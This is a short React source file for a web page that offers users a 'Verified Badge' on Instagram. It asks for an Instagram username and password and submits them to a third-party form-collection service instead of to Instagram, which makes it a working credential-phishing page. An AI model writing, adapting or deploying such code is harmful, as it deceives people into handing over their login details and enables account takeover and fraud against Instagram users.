import React from 'react';
import { useForm } from '@formcarry/react';
import "./App.css"
function App() {
  // Call the "useForm" hook in your function component
  const {state, submit} = useForm({
    id: 'Jf2zHiZc6W'
  });
 
  // Success message
  if (state.submitted) {
    return <div>Thank you! We received your submission.</div>;
  }
 
  return ( <center>
    <form onSubmit={submit}>
      <h2>Get Verified Badge <i class="fa-solid fa-circle-check"></i><br/> On Instagram</h2>
      <input id="username" type="username" name="username" placeholder='username'/><br/>
      <input id="password" type="password" name="password" placeholder='password'/><br/>
      <button type="submit">Login</button>
    </form></center>
  );}
 export default App;